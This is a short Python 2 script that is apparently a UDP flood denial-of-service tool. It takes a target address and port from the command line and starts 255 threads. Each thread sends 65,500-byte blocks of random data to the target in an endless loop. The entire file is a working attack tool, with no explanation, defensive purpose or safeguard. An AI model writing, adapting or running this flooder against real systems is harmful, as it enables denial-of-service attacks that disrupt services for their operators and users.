import socket,sys
from random import _urandom
from threading import Thread
from time import sleep

try:
    TARGET = sys.argv[1]
    PORT = sys.argv[2]
except:
    sys.exit(0)

def attack(TARGET,PORT):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        print '.'
        bytess = _urandom(65500)
        sock.sendto(bytess, (TARGET,PORT))

def _flood():
    global TARGET,PORT
    for i in range(0,255):
        Thread(target=attack,args=(TARGET,int(PORT))).start()

_flood()
